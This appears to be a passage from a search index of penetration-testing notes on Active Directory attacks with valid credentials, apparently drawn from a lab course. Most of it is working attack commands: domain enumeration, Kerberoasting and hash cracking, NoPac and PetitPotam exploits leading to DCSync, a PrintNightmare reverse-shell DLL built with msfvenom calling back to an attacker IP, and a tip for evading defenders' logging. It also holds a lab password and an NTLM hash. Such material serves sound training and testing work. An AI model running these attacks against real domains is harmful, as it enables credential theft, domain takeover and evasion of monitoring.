wmic useraccount list /format:list Displays information about all local accounts and any domain accounts that have logged into the device wmic group list /format:list   Information about all local groups wmic sysaccount list /format:list  Dumps information about any system accounts that are being used as service accounts."},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#net-commands","title":"Net Commands","text":"Command Description net accounts Information about password requirements net accounts /domain Password and lockout policy net group /domain Information about domain groups net group \"Domain Admins\" /domain List users with domain admin privileges net group \"domain computers\" /domain List of PCs connected to the domain net group \"Domain Controllers\" /domain List PC accounts of domains controllers net group  /domain User that belongs to the group net groups /domain List of domain groups net localgroup All available groups net localgroup administrators /domain List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) net localgroup Administrators Information about a group (admins) net localgroup administrators [username] /add Add user to administrators net share Check current shares net user  /domain Get information about a user within the domain net user /domain List all users of the domain net user %username% Information about the current user net use x: \\computer\\share Mount the share locally net view Get a list of computers net view /all /domain[:domainname] Shares on the domains net view \\computer /ALL List shares of a computer net view /domain List of PCs of the domain"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#net-commands-trick","title":"Net Commands Trick","text":"<p>If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#dsquery","title":"Dsquery","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#user-search","title":"User Search","text":"<pre><code>PS &gt; dsquery user\n\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#computer-search","title":"Computer Search","text":"<p>PS &gt; dsquery computer</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#wildcard-search","title":"Wildcard Search","text":"<p>PS &gt; dsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#users-with-specific-attributes-set-passwd_notreqd","title":"Users With Specific Attributes Set (PASSWD_NOTREQD)","text":"<p>PS C:\\htb&gt; dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#searching-for-domain-controllers","title":"Searching for Domain Controllers","text":"<p>PS C:\\Users\\forend.INLANEFREIGHT&gt; dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/","title":"Kerberoasting","text":"<p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.</p> <p>Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account\u2019s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.</p> <p>Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#linux","title":"Linux","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#kerberoasting-performing-the-attack","title":"Kerberoasting - Performing the Attack","text":"<p>Depending on your position in a network, this attack can be performed in multiple ways:</p> <ul> <li>From a non-domain joined Linux host using valid domain user credentials.</li> <li>From a domain-joined Linux host as root after retrieving the keytab file.</li> <li>From a domain-joined Windows host authenticated as a domain user.</li> <li>From a domain-joined Windows host with a shell in the context of a domain account.</li> <li>As SYSTEM on a domain-joined Windows host.</li> <li>From a non-domain joined Windows host using runas /netonly.</li> </ul> <p>Several tools can be utilized to perform the attack:</p> <ul> <li>Impacket\u2019s GetUserSPNs.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py] from a non-domain joined Linux host.</li> <li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li> <li>From Windows, utilizing tools such as PowerView[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1], Rubeus[https://github.com/GhostPack/Rubeus], and other PowerShell scripts.</li> </ul> <p>Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#kerberoasting-with-getuserspnspy","title":"Kerberoasting with GetUserSPNs.py","text":"<p><code>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</code></p> <p>We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.</p> <p>Listing SPN Accounts with GetUserSPNs.py</p> <pre><code>$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt;\n</code></pre> <p>We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts. Requesting all TGS Tickets</p> <pre><code>$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request\n</code></pre> <p>We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account. Requesting a Single TGS ticket</p> <pre><code>$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request-user &lt;DC_USER&gt;\n</code></pre> <p>Saving the TGS Ticket to an Output File</p> <pre><code>$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request-user &lt;DC_USER&gt; -outputfile &lt;FILENAME&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#windows","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#kerberoasting-semi-manual-method","title":"Kerberoasting - Semi Manual method","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#enumerating-spns-with-setspnexe","title":"Enumerating SPNs with setspn.exe","text":"<pre><code>&gt; setspn.exe -Q */*\n</code></pre> <p>Targeting a Single User</p> <pre><code>&gt; Add-Type -AssemblyName System.IdentityModel\n&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"\n</code></pre> <p>Retrieving All Tickets Using setspn.exe</p> <pre><code>PS &gt; setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#extracting-tickets-from-memory-with-mimikatz","title":"Extracting Tickets from Memory with Mimikatz**","text":"<pre><code>mimikatz # base64 /out:true\nmimikatz # kerberos::list /export  \n\n</code></pre> <p>Preparing the Base64 Blob for Cracking</p> <pre><code>$ echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n \n</code></pre> <p>Placing the Output into a File as .kirbi</p> <pre><code>$ cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre> <p>Extracting the Kerberos Ticket using kirbi2john.py</p> <pre><code>$ python2.7 kirbi2john.py sqldev.kirbi\n</code></pre> <p>Modifiying crack_file for Hashcat</p> <pre><code>$ sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#automated-tool-based-route","title":"Automated / Tool Based Route","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#using-powerview-to-extract-tgs-tickets-httpsrawgithubusercontentcompowershellmafiapowersploitmasterreconpowerviewps1","title":"Using PowerView to Extract TGS Tickets [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1]","text":"<pre><code>PS &gt; Import-Module .\\PowerView.ps1\nPS &gt; Get-DomainUser * -spn | select samaccountname\n</code></pre> <p>Using PowerView to Target a Specific User</p> <pre><code>PS &gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n</code></pre> <p>Exporting All Tickets to a CSV File</p> <pre><code>PS &gt; Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n</code></pre> <p>Viewing the Contents of the .CSV File</p> <pre><code>PS &gt; cat .\\ilfreight_tgs.csv\n</code></pre> <p>We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#using-rubeus-httpsgithubcomghostpackrubeus","title":"Using Rubeus [https://github.com/GhostPack/Rubeus]","text":"<pre><code>PS &gt; .\\Rubeus.exe\n</code></pre> <p>Using the /stats Flag</p> <pre><code>PS &gt; .\\Rubeus.exe kerberoast /stats\n</code></pre> <p>If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.</p> <p>Using the /nowrap Flag</p> <pre><code>PS &gt; .\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap\n</code></pre> <p>Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the \"\"/nowrap\" flag prevents any base64 ticket blobs from being column wrapped for any function\"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.</p> <p>Exporting to file PS &gt; .\\Rubeus.exe kerberoast /outfile:out.txt</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#cracking-the-ticket-offline-with-hashcat","title":"Cracking the Ticket Offline with Hashcat**","text":"<pre><code>$ hashcat -m 13100 &lt;FILENAME&gt; /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#a-note-on-encryption-types","title":"A Note on Encryption Types","text":"<p><code>The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.</code></p> <p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.</p> <pre><code>PS &gt; .\\Rubeus.exe kerberoast /user:testspn /nowrap\n</code></pre> <pre><code>PS &gt; Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n</code></pre> <p>Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here[https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797] tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#cracking-the-ticket-with-hashcat-rockyoutxt","title":"Cracking the Ticket with Hashcat &amp; rockyou.txt","text":"<pre><code>$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#running-hashcat","title":"Running Hashcat","text":"<pre><code>$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Kerberoasting/#using-the-tgtdeleg-flag","title":"Using the /tgtdeleg Flag","text":"<p>We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.</p> <p><code>Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</code></p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/","title":"Vulnerabilities","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#nopac-samaccountname-spoofing","title":"NoPac (SamAccountName Spoofing)","text":"<p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.</p> <p>NoPac [https://github.com/Ridter/noPac] uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac [] exploit repo is cloned to our attack host if needed. We can use these commands to do so:</p> <p>we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.</p> <p>Scanning for NoPac</p> <pre><code>$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap\n</code></pre> <p>Running NoPac &amp; Getting a Shell</p> <pre><code>$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap\n</code></pre> <p>It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.</p> <p>Using noPac to DCSync the Built-in Administrator Account</p> <pre><code>$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#printnightmare","title":"PrintNightmare","text":"<p>PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.</p> <p>We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#enumerating-for-ms-rprn","title":"Enumerating for MS-RPRN","text":"<pre><code>$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#generating-a-dll-payload","title":"Generating a DLL Payload","text":"<pre><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll\n\n$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll\n\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\\\172.16.5.225\\CompData\\backupscript.dll'\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#petitpotam-ms-efsrpc","title":"PetitPotam (MS-EFSRPC)","text":"<p>PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft\u2019s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.</p> <pre><code>$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#running-petitpotampy","title":"Running PetitPotam.py","text":"<pre><code>$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       \n</code></pre> <p>Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#requesting-a-tgt-using-gettgtpkinitpy","title":"Requesting a TGT Using gettgtpkinit.py","text":"<p>Next, we can take this base64 certificate and use gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.</p> <pre><code>$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#setting-the-krb5ccname-environment-variable","title":"Setting the KRB5CCNAME Environment Variable","text":"<p>The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.</p> <pre><code>$ export KRB5CCNAME=dc01.ccache\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#using-domain-controller-tgt-to-dcsync","title":"Using Domain Controller TGT to DCSync","text":"<p>We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.</p> <pre><code>$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#confirming-admin-access-to-the-domain-controller","title":"Confirming Admin Access to the Domain Controller","text":"<p>Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.</p> <pre><code>$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#miscellaneous-misconfigurations","title":"Miscellaneous Misconfigurations","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#privexchange","title":"PrivExchange","text":"<p>The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.</p> <p>The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#printer-bug","title":"Printer Bug","text":"<p>The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.</p> <p>The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.</p> <p>The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.</p> <p>We can use tools such as the Get-SpoolStatus module from this tool or [https://github.com/NotMedic/NetNTLMtoSilverTicket] this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#exchange-related-group-membership","title":"Exchange Related Group Membership","text":"<p>A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This GitHub repo details a few techniques for leveraging Exchange for escalating privileges in an AD environment.</p> <p>The Exchange group Organization Management is another extremely powerful group (effectively the \"Domain Admins\" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#enumerating-dns-records","title":"Enumerating DNS Records","text":"<p>We can use a tool such as adidnsdump [https://github.com/dirkjanm/adidnsdump] to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as BloodHound is similar to SRV01934.INLANEFREIGHT.LOCAL. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as JENKINS.INLANEFREIGHT.LOCAL, which we can use to better plan out our attacks.</p> <p>The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the adidnsdump tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this post.</p> <p>On the first run of the tool, we can see that some records are blank, namely ?,LOGISTICS,?.</p> <pre><code>$ adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r\n</code></pre> <pre><code>$ head records.csv\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#password-in-description-field","title":"Password in Description Field","text":"<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#finding-passwords-in-the-description-field-using-get-domain-user","title":"Finding Passwords in the Description Field using Get-Domain User","text":"<pre><code>PS &gt; Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#passwd_notreqd-field","title":"PASSWD_NOTREQD Field","text":"<p>It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don\u2019t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#checking-for-passwd_notreqd-setting-using-get-domainuser","title":"Checking for PASSWD_NOTREQD Setting using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#group-policy-object-gpo-abuse","title":"Group Policy Object (GPO) Abuse","text":"<p>Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.</p> <p>GPO misconfigurations can be abused to perform the following attacks:</p> <ul> <li>Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)</li> <li>Adding a local admin user to one or more hosts</li> <li>Creating an immediate scheduled task to perform any number of actions</li> <li>We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use group3r, ADRecon, PingCastle, among others, to audit the security of GPOs in a domain.</li> </ul> <p>Using the Get-DomainGPO function from PowerView, we can get a listing of GPOs by 